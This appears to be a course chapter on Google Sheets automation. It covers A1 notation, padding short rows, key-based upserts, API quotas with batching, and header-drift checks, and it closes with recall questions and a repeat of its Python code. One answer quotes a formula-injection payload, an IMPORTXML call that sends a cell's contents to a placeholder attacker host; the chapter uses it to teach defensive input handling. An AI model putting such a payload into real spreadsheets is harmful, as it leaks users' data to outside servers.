# Google Sheets Automation

Spreadsheets are the most widely used database in the world, even though they are not databases. In small businesses, a Google Sheet is often the order log, the lead list, the content calendar, and the stock count, all at once. Automations read from sheets, write to them, and look things up in them, and every workflow tool covered in this unit has Google Sheets steps among its most used.

This chapter treats a sheet as what automations need it to be: a lightweight table. It covers addressing cells and ranges, A1 notation; the operations, read, append, update, and lookup; why every row needs a key; the limits that throttle busy automations; and the problems that appear when several automations and several people share one sheet, overwritten data, duplicate rows, and columns that move. The lab builds the pieces that turn a sheet into a dependable table.

## 1. First-Principles Mental Model & Intuition

### A ledger on a shared desk

Picture a paper ledger on a desk in a busy office. Anyone can walk up and write in it. Each line is one order. The first line names the columns: order number, email, status, total. It works beautifully for one person. With five people and three robots writing in it, problems appear: two people update the same line at once and one change is lost; someone adds a line for an order that is already there; someone else inserts a new column in the middle, and the robot that writes "the third column" now writes the status into the wrong place.

A Google Sheet used by automations is exactly this ledger.

```text
              A            B                    C          D
        +------------+-------------------+-----------+--------+
   1    | order_id   | email             | status    | total  |   header row: column names
        +------------+-------------------+-----------+--------+
   2    | A1001      | priya@example.com | paid      | 84     |   one record per row
   3    | A1002      | ben@example.com   |           |        |   short row: empty cells
   4    |            |                   |           |        |   blank row: a gap
   5    | A1003      | cal@example.com   | shipped   | 22.5   |
        +------------+-------------------+-----------+--------+
   range for the data:  Orders!A2:D5          key column: order_id
```

Three ideas keep it working:

1. **Address by name, not position.** Find the column called "status", not "column C".
2. **Every row has a key.** A value that identifies the record, such as an order ID, used to find it again.
3. **Change rows by key.** Look the key up, then update that row if it exists, or add a row if it does not.

## 2. Core Theory, Mathematical Foundations & Architecture Internals

### A1 notation

Sheets addresses cells with **A1 notation**: a column letter and a row number. Columns run A to Z, then AA to AZ, BA, and so on, like a counting system with 26 digits but no zero. Ranges join two corners with a colon, and a sheet name in front, followed by an exclamation mark, says which tab.

| Notation | Means |
|---|---|
| `B3` | Column B, row 3 |
| `Orders!A2:D41` | Columns A to D, rows 2 to 41, on the tab named Orders |
| `Orders!A:D` | Whole columns A to D |
| `'Q4 leads'!A1:AD1` | A tab name containing a space must be quoted |

Converting a column number to letters is a classic small algorithm. Because there is no zero digit, it is "base 26 with digits 1 to 26": subtract one before each division. Column 26 is Z, 27 is AA, 52 is AZ, 702 is ZZ, and 703 is AAA. Code that builds ranges from column numbers needs it, and gets columns past Z wrong surprisingly often.

### What a read returns

The Sheets API returns a range's values as a list of rows, each a list of cell values. Google's documentation states one behaviour that trips up nearly everyone: **empty trailing rows and columns are omitted**. A row whose last two cells are empty comes back two values short. A blank row comes back as an empty list. Code that assumes every row has as many values as there are headers will fail on the first short row, or silently put values under the wrong names.

Turning rows into records therefore means: take the first row as headers, pad each short row with empty values, skip blank rows, and remember each record's sheet row number, which is needed to update it later.

### The operations

| Operation | API | Notes |
|---|---|---|
| Read | `values.get`, `values.batchGet` | One range or several |
| Append | `values.append` | Adds rows after the existing table |
| Update | `values.update`, `values.batchUpdate` | Writes values to a given range |
| Lookup | Read then search in code, or a tool's lookup step | Sheets has no index; a lookup reads the column |
| Clear and delete | `values.clear`, `batchUpdate` with delete requests | Clearing leaves an empty row; deleting shifts rows up |

Writing has an option that matters for security. With `valueInputOption` set to `RAW`, values are stored exactly as sent. With `USER_ENTERED`, values are interpreted as if typed into the sheet: "Mar 1 2016" becomes a date and "=1+2" becomes a **formula**. If an automation writes text that came from a form or an email using `USER_ENTERED`, a submission beginning with an equals sign becomes a live formula, and spreadsheet formulas can fetch web pages and send data out. Data from outside should be written `RAW`.

Deleting rows deserves a warning of its own. When a row is deleted, every row below moves up one, and every remembered row number below it becomes wrong. Automations that delete rows should delete from the bottom up, or mark rows as cancelled instead of deleting them.

### Keys and upserts

Sheets has no built-in notion of a unique key, so an automation must enforce one. The pattern is the **upsert**, "update or insert":

1. Read the key column.
2. Normalise the incoming key the same way as the stored keys: trim spaces, and fix the case where the business treats "a1004" and "A1004" as the same.
3. If the key exists, update that row.
4. If not, append a new row, and remember the key, so a second record with the same key in the same batch updates the new row instead of appending again.

If the sheet already contains a key twice, the upsert cannot know which row to update. The safe response is to stop and report the duplicate, not to pick one.

Workflow tools offer this as a single step, such as n8n's "Append or Update Row", Make's "Search Rows" followed by a router, or Zapier's "Lookup Spreadsheet Row" with "create if not found". All of them follow the same four steps, and all depend on the key column being clean.

### Limits and batching

Google's published limits for the Sheets API, at the time of writing (November 2026), are 300 read requests and 300 write requests per minute per project, and **60 of each per minute per user** per project. Exceeding them returns status 429, and Google recommends truncated exponential backoff: wait $2^n$ seconds plus a random number of milliseconds up to 1,000, up to a maximum of typically 32 or 64 seconds, where $n$ counts the attempts. The random part, called jitter, stops many clients from retrying in lockstep, a point Module 7.14 develops.

Two other facts shape design. Each **batch** request, including all its sub-requests, counts as one request towards the limit. And batch updates are atomic: if one sub-request is invalid, none of the changes are applied. A request that takes more than 180 seconds to process times out. Google recommends keeping payloads under about 2 MB.

The arithmetic of batching is simple and decisive. Writing 500 rows one request at a time is 500 requests: at 60 per minute for one user, that takes

$$\left\lceil \frac{500}{60} \right\rceil = 9 \text{ minutes}$$

of quota, during which every other automation using the same account is starved. Writing them in batches of 100 rows is 5 requests, done within a minute.

A spreadsheet can hold up to 20 million cells, according to Google Drive's file limits at the time of writing, and a single cell up to 50,000 characters. Long before those limits, a sheet becomes slow to load and to search, which is the usual sign that the data belongs in a real database.

### Concurrency

Two automations that read a row, change it, and write it back can lose each other's changes: both read status "paid", one writes "shipped", the other writes "refunded" based on its stale copy, and whichever writes last wins. Sheets offers no transactions across separate requests. The defences are practical:

| Defence | How |
|---|---|
| One writer per column | The fulfilment automation owns "status"; billing owns "refund" |
| Write only the cells you change | Update one cell, not the whole row |
| Append-only logs | Record events as new rows, never edit old ones |
| A "last updated" column | Detect when a row changed after you read it |

### Schema drift

People edit sheets. They insert columns, rename headers, and reorder them. An automation that writes by position, "column C is status", will write the right values into the wrong columns after someone inserts a column before C, with no error at all. An automation that writes by **header name** survives reordering, and one that **checks the headers** at the start of each run can stop with a clear message when a column it needs has been renamed or removed. This is the same "check at the entry" principle as Module 7.5's type checks.

### When a sheet is the wrong tool

| Signal | Consider instead |
|---|---|
| Tens of thousands of rows, slow lookups | A database, or a tool's own table such as Zapier Tables or n8n Data Tables |
| Several automations editing the same rows | A database with transactions |
| Strict data types and validation | A database or a form with validation |
| Customer personal data shared widely | A system with proper access control |

Sheets remain excellent for logs, small lookup tables, reports, and anything people need to read and adjust by hand.

### Complexity

Converting a column number to letters takes time proportional to the number of letters, which grows with the logarithm of the column number. Turning rows into records is linear in the cells. An upsert is linear in the stored and incoming rows with a dictionary index. Request counts are the number of operations divided by the batch size, rounded up.

## 3. Production-Grade Implementation & Annotated Walkthrough

First, column letters and ranges.

```python
def column_letter(number):
    if number < 1:
        raise ValueError("columns start at 1")
    letters = ""
    while number:
        number, remainder = divmod(number - 1, 26)
        letters = chr(65 + remainder) + letters
    return letters

def a1_range(sheet, first_row, first_col, last_row, last_col):
    name = sheet if sheet.replace("_", "").isalnum() else "'" + sheet.replace("'", "''") + "'"
    return f"{name}!{column_letter(first_col)}{first_row}:{column_letter(last_col)}{last_row}"

print([column_letter(n) for n in (1, 26, 27, 52, 53, 702, 703, 18278)])
print(a1_range("Orders", 2, 1, 41, 6), a1_range("Q4 leads", 1, 1, 1, 30), a1_range("Bob's", 1, 1, 1, 1))
```

- **`column_letter` subtracts one before each division.** That handles the missing zero: 26 is Z, not "A followed by a zero digit".
- **The results are A, Z, AA, AZ, BA, ZZ, AAA, and ZZZ.** Column 18,278 is ZZZ, the last three-letter column.
- **`a1_range` quotes tab names that are not simple words.** A space or an apostrophe needs quotes, and an apostrophe inside is doubled, as in `'Bob''s'`.
- **Column 30 is AD.** The header row of a 30-column sheet is `'Q4 leads'!A1:AD1`.

Next, rows to records.

```python
VALUES = [["order_id", "email", "status", "total"],
          ["A1001", "priya@example.com", "paid", "84"],
          ["A1002", "ben@example.com"],
          [],
          ["A1003", "cal@example.com", "shipped", "22.5", "extra"]]

def rows_to_records(values):
    if not values:
        return []
    headers = values[0]
    records = []
    for row_number, row in enumerate(values[1:], start=2):
        if not any(str(cell).strip() for cell in row):
            continue
        padded = list(row[:len(headers)]) + [""] * (len(headers) - len(row))
        record = dict(zip(headers, padded))
        record["_row"] = row_number
        records.append(record)
    return records

for record in rows_to_records(VALUES):
    print(record)
```

- **The first row is the header.** Every record uses its names.
- **Short rows are padded with empty strings.** Row 3 came back with two values because the API omits empty trailing cells; padding restores status and total as empty.
- **Blank rows are skipped, but counted.** Row 4 is skipped, and the next record is correctly numbered row 5, not row 4.
- **Values beyond the last header are dropped.** "extra" in row 5 has no column name; keeping it would mean inventing one.
- **Each record remembers its sheet row in `_row`.** An update needs it, and the underscore marks it as bookkeeping, not data.

Then, planning an upsert.

```python
HEADERS = ["order_id", "email", "status", "total"]

def plan_upsert(records, headers, key, incoming):
    index = {}
    for record in records:
        normal = str(record[key]).strip().lower()
        if normal in index:
            raise ValueError("duplicate key in sheet: " + normal)
        index[normal] = record["_row"]
    operations, next_row = [], max([record["_row"] for record in records], default=1) + 1
    for item in incoming:
        normal = str(item[key]).strip().lower()
        values = [item.get(header, "") for header in headers]
        if normal in index:
            operations.append(("update", index[normal], values))
        else:
            operations.append(("append", next_row, values))
            index[normal] = next_row
            next_row += 1
    return operations

INCOMING = [{"order_id": "A1002", "email": "ben@example.com", "status": "paid", "total": "40"},
            {"order_id": "a1004", "email": "dee@example.com", "status": "paid", "total": "15"},
            {"order_id": "A1004", "email": "dee@example.com", "status": "shipped", "total": "15"}]
for operation in plan_upsert(rows_to_records(VALUES), HEADERS, "order_id", INCOMING):
    print(operation)
```

- **The index maps each normalised key to its row.** Lookups are then a dictionary access, not a scan per item.
- **A duplicate key already in the sheet stops the plan.** Choosing one of two rows silently would update the wrong order half the time.
- **A1002 exists, so it becomes an update of row 3.** Its status and total are filled in.
- **a1004 is new and is appended at row 6,** after the last used row, 5.
- **The second A1004 updates row 6 instead of appending again.** The new key was added to the index, and normalisation treats "a1004" and "A1004" as the same order. Without this, one batch would create two rows for one order.
- **Values are listed in header order, by name.** Missing fields become empty cells.

Finally, batching and schema drift.

```python
import math

def requests_needed(operations, batched, per_batch=100):
    return math.ceil(len(operations) / per_batch) if batched else len(operations)

def minutes_needed(requests, per_minute=60):
    return math.ceil(requests / per_minute)

rows = list(range(500))
print(requests_needed(rows, False), minutes_needed(requests_needed(rows, False)))
print(requests_needed(rows, True), minutes_needed(requests_needed(rows, True)))

def drift(expected, actual):
    missing = [header for header in expected if header not in actual]
    added = [header for header in actual if header not in expected]
    moved = [header for header in expected if header in actual and expected.index(header) != actual.index(header)]
    return {"missing": missing, "added": added, "moved": moved}

print(drift(HEADERS, ["order_id", "customer_email", "status", "total", "notes"]))
print(drift(HEADERS, ["order_id", "status", "email", "total"]))
```

- **500 single-row writes are 500 requests and 9 minutes of one user's quota.**
- **In batches of 100, they are 5 requests, within one minute.** Each batch counts as one request, whatever it contains.
- **`drift` compares expected headers with what is in the sheet.** It reports headers that are missing, headers that were added, and headers that are present but in a different position.
- **A renamed column shows as one missing and one added.** "email" became "customer_email". An automation writing by name must stop here; one writing by position would carry on writing emails into a column now meant for something else, or vice versa.
- **Swapped columns show as moved.** Writing by name handles this safely; writing by position puts statuses under "email".

**Complexity.** `column_letter` is proportional to the number of letters. `rows_to_records` is linear in the cells. `plan_upsert` is linear in the stored plus incoming rows. `requests_needed` and `minutes_needed` are constant. `drift` is quadratic in the number of headers because of `index`, which is negligible for real sheets.

### A sheet that automations can rely on

```text
TAB           Orders                      one tab per table; no merged cells in the data
ROW 1         headers only, frozen        names in snake_case, never changed without updating automations
KEY           order_id in column A        unique, checked on every upsert
WRITERS       intake owns A-D; fulfilment owns status; billing owns refund
INPUT         valueInputOption RAW for anything from outside
CHANGES       update by key; never delete rows, set status = cancelled
BATCH         up to 100 rows per request; backoff on 429 with jitter
CHECK         headers compared on every run; stop on missing columns
LOG           a separate Events tab, append-only
```

### Choosing an operation

| Situation | Operation |
|---|---|
| New event to record | Append to a log tab |
| Record that may already exist | Upsert by key |
| Many rows to write | Batch update |
| Find one record | Read the key column once, look up in code |
| Remove a record | Mark as cancelled rather than delete |

## 4. Practitioner Wisdom & Edge Cases (Reddit / HN / Stack Overflow Synthesis)

**Writing by column position.** Someone inserts a column and every value lands one place off. Map by header name and check headers each run.

**Short rows.** Empty trailing cells are not returned. Pad rows to the header length.

**Blank rows in the middle.** They break naive "last row" logic and can confuse table detection. Skip them when reading, and avoid creating them.

**No key column.** Without a key, updates cannot find their row, and duplicates multiply. Add one.

**Case and space differences in keys.** "A1004 " and "a1004" become separate rows. Normalise keys.

**Formula injection.** Text beginning with "=" written as user-entered becomes a formula. Write outside data as raw values.

**One request per row.** Quota runs out quickly at 60 requests per user per minute. Batch.

**Deleting rows during a loop.** Row numbers shift upward after each delete. Delete from the bottom up, or mark rows instead.

**Two automations editing the same row.** The last write wins. Give each column one owner and write only changed cells.

**Numbers stored as text.** "84" and 84 sort and add differently. Decide the type per column and convert on read, as Module 7.5 advised.

**Dates in local formats.** "03/04/2026" means different days in different countries. Store ISO dates.

**Growing a sheet into a database.** Slow loads and constant conflicts are the signal to move the data. Keep the sheet as a view if people like it.

## 5. Active Recall Check & Synthesis Summary

**Summary.** A Google Sheet used by automations is a shared ledger that needs discipline to behave like a table. Cells are addressed in A1 notation, with columns lettered A to Z, AA onwards, computed as base 26 without a zero, and ranges qualified by a tab name, quoted if it is not a simple word. Reads return lists of rows with empty trailing cells and rows omitted, so records are built by taking the header row, padding short rows, skipping blanks, and remembering each record's row number. Outside data is written raw, never as user-entered text that could become a formula, and rows are marked rather than deleted because deletion shifts row numbers. The Sheets API allows 300 read and 300 write requests per minute per project and 60 per user at the time of writing, with 429 errors to be handled by exponential backoff with jitter; batches count as one request and are atomic, so batching turns minutes of quota into seconds. Concurrency is handled by column ownership and writing only changed cells, and schema drift by mapping columns by name and checking headers every run. When a sheet outgrows these practices, the data belongs in a database.

**Question 1.** An automation reads `Orders!A1:F` and builds records with `dict(zip(headers, row))`. On a sheet where many orders have no "notes" or "refund" yet, the last two columns, some records are missing those fields entirely, and a later step that reads `record["refund"]` crashes. Explain why, and how to fix the reading code. What else in this sheet might trip up a naive reader?

<details>
<summary>View Answer</summary>

The Sheets API omits empty trailing cells, so a row whose last two cells are empty comes back with only four values. `zip` stops at the shorter list, so the record gets only the first four headers, and the "notes" and "refund" keys are absent rather than empty; reading `record["refund"]` then raises a KeyError. The fix is to pad each row to the header length with empty strings before zipping, so every record has every field, and to read optional fields with a default where appropriate. Other traps in the same sheet: blank rows in the middle come back as empty lists, which a naive reader turns into empty records, or which shift row numbers if the reader counts records instead of sheet rows, so blank rows should be skipped while keeping the true row number; values beyond the last header have no name and should be dropped or flagged; numbers come back as text, depending on the read options, so totals need converting; and a header row that someone has edited may no longer match what the automation expects, which a header check at the start of each run catches.

</details>

**Question 2.** A nightly automation writes 1,200 updated stock levels to a sheet, one `values.update` request per row, using the same account as a daytime order automation. Calculate how long the nightly job occupies that user's write quota, what the daytime automation would experience if the job overran into the morning, and how to redesign it.

<details>
<summary>View Answer</summary>

At 60 write requests per minute per user, 1,200 single-row requests need 1,200 divided by 60, which is 20 minutes, assuming the job paces itself perfectly; in practice it will send faster, hit 429 errors, and back off, taking at least that long. During those minutes the user's write quota is fully used, so if the job overran into business hours, the daytime order automation, sharing the same account and project, would receive 429 errors on its writes: new orders would fail to be logged, or be delayed by backoff, and without good retry handling some could be lost. Redesign: use `values.batchUpdate` with many ranges in one request, since a batch counts as one request; 1,200 rows in batches of 100 is 12 requests, which fits in a single minute. Because batches are atomic, validate the data first so one bad value does not reject a whole batch, and keep batches well under the 2 MB payload guidance. Additionally, give the nightly job its own service account, so the per-user quota is separate, schedule it well away from business hours, and handle 429 with exponential backoff and jitter.

</details>

**Question 3.** A lead form writes submissions to a sheet with an upsert keyed on email. Three problems appear: some people appear twice, once as "Sam@Gym.com" and once as "sam@gym.com "; one submission's "company" field read `=IMPORTXML("https://evil.example/?d="&B2, "//x")` and turned into a formula; and after a colleague inserted a "phone" column between "email" and "company", company names started appearing in the phone column. Explain each cause and the fix.

<details>
<summary>View Answer</summary>

Duplicates: the upsert compared keys exactly, so differences in capitals and a trailing space made the same address look new. Normalise keys before comparing and before storing, by trimming and lower-casing email addresses, and clean up the existing duplicates once, merging their rows; then the upsert finds the existing row and updates it. Formula: the automation wrote values with the user-entered input option, so text beginning with an equals sign was interpreted as a formula. That formula could fetch a URL containing data from the sheet, sending it to an outside server. Write anything from outside with the raw input option, so it is stored as text; as a second layer, a validation step can reject or escape values beginning with "=", "+", "-", or "@" in fields that should never contain formulas. Then remove the formula from the sheet and check whether it ran. Wrong column: the automation wrote by position, so after a column was inserted, the third value, company, landed in the new third column, phone. Map values to columns by header name, building each row in the order of the current header row, and check the headers at the start of every run, stopping with a clear message if expected columns are missing or renamed. Agreeing that headers are changed only together with the automations that use them prevents the surprise in the first place.

# ---------------------------------------------------------------- Step 1
def column_letter(number):
    """Base 26 with digits 1 to 26: subtract one before each division, because there is no zero."""
    if number < 1:
        raise ValueError("columns start at 1")
    letters = ""
    while number:
        number, remainder = divmod(number - 1, 26)
        letters = chr(65 + remainder) + letters
    return letters


def a1_range(sheet, first_row, first_col, last_row, last_col):
    """Quote tab names that are not simple words, doubling inner apostrophes."""
    name = sheet if sheet.replace("_", "").isalnum() else "'" + sheet.replace("'", "''") + "'"
    return f"{name}!{column_letter(first_col)}{first_row}:{column_letter(last_col)}{last_row}"


# ---------------------------------------------------------------- Step 2
def rows_to_records(values):
    """The API omits empty trailing cells and rows: pad short rows, skip blank ones, and keep
    the true sheet row number for later updates."""
    if not values:
        return []
    headers = values[0]
    records = []
    for row_number, row in enumerate(values[1:], start=2):
        if not any(str(cell).strip() for cell in row):
            continue
        padded = list(row[:len(headers)]) + [""] * (len(headers) - len(row))
        record = dict(zip(headers, padded))
        record["_row"] = row_number
        records.append(record)
    return records


# ---------------------------------------------------------------- Step 3
def plan_upsert(records, headers, key, incoming):
    """Update by key or append, never both; new keys are remembered so one batch cannot
    append the same record twice; existing duplicates stop the plan."""
    index = {}
    for record in records:
        normal = str(record[key]).strip().lower()
        if normal in index:
            raise ValueError("duplicate key in sheet: " + normal)
        index[normal] = record["_row"]
    operations, next_row = [], max([record["_row"] for record in records], default=1) + 1
    for item in incoming:
        normal = str(item[key]).strip().lower()
        values = [item.get(header, "") for header in headers]
        if normal in index:
            operations.append(("update", index[normal], values))
        else:
            operations.append(("append", next_row, values))
            index[normal] = next_row
            next_row += 1
    return operations


# ---------------------------------------------------------------- Step 4
def requests_needed(operations, batched, per_batch=100):
    """A batch counts as one request, whatever it contains."""
    return math.ceil(len(operations) / per_batch) if batched else len(operations)


def minutes_needed(requests, per_minute=60):
    """60 write requests per minute per user, at the time of writing."""
    return math.ceil(requests / per_minute)


# ---------------------------------------------------------------- Step 5
def drift(expected, actual):
    """Compare headers by name: a rename is missing plus added; a reorder is moved."""
    missing = [header for header in expected if header not in actual]
    added = [header for header in actual if header not in expected]
    moved = [header for header in expected if header in actual and expected.index(header) != actual.index(header)]
    return {"missing": missing, "added": added, "moved": moved}
